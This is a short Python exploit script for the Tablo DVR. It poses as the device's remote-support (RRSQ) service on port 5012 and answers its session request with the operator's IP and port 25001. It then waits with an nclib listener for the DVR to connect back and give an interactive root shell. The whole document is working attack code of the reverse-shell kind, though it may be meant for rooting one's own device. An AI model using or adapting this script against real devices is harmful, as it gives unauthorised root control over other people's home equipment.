#!/usr/bin/env python3
import argparse
import json
import nclib
import socket


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def socket_server(ip, port, resp_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Tablo at {addr[0]} connected!")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                else:
                    try:
                        payload = json.loads(data.decode())
                    except Exception:
                        print(f"Error processing payload of {data.decode()}")
                        continue
                    if "sid" in payload:
                        payload = str({"ip": ip, "port": resp_port}) + "\n"
                        conn.sendall(payload.encode())
                        s.shutdown(socket.SHUT_RDWR)
                        s.close()
                        break


def nc_server(ip, port):
    server = nclib.TCPServer((ip, port))
    for client in server:
        print("Connected to %s:%d" % client.peer)
        try:
            client.interact()
        # handle exceptions and exiting
        except KeyboardInterrupt:
            print("\nKeyboardInterrupt")
            exit(0)
        except Exception as e:
            print(f"\nException Occurred: {e}")
            exit(1)


def main():
    ourip = (
        get_ip()
    )  # We need our IP so we can tell the Tablo what to connect to with rrs
    rrsq_port = 5012  # This is hard coded into nv_rrsq it seems, good for us!
    root_port = (
        25001  # This is the port we will use to open our socket for the root shell
    )

    print(f"Starting our Socket Server on {ourip}:{rrsq_port}...")
    socket_server(ourip, rrsq_port, root_port)

    print(f"Payload sent! Starting up shell, please wait for the Tablo to connect...")
    nc_server(ourip, root_port)


# Start the logic
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="A tool to mock an RRSQ response for the Tablo DVR, and provide a root shell."
    )
    args = parser.parse_args()
    main()
